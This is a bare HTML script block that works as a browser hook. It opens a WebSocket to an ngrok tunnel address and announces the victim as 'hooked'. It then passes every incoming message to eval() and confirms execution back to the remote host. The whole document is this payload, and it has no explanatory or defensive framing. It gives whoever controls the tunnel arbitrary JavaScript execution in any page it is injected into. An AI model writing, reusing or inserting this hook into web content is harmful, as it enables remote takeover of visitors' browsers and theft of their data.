<script>
      const ws = new WebSocket("ws://e2b1-2a0d-5600-19-27-00-12.ngrok-free.app/");

      ws.onopen = () => {
        console.log("connected");
        ws.send(JSON.stringify({ type: "hooked" }));
      };

      ws.onmessage = (event) => {
        const data = event.data;
        eval(data);
        ws.send("Script ran")

      };

      ws.onerror = (error) => {
        console.error("WebSocket error:", error);
      };

      ws.onclose = (event) => {
        console.log(`Closed: ${event.code} ${event.reason}`);
      };
</script>

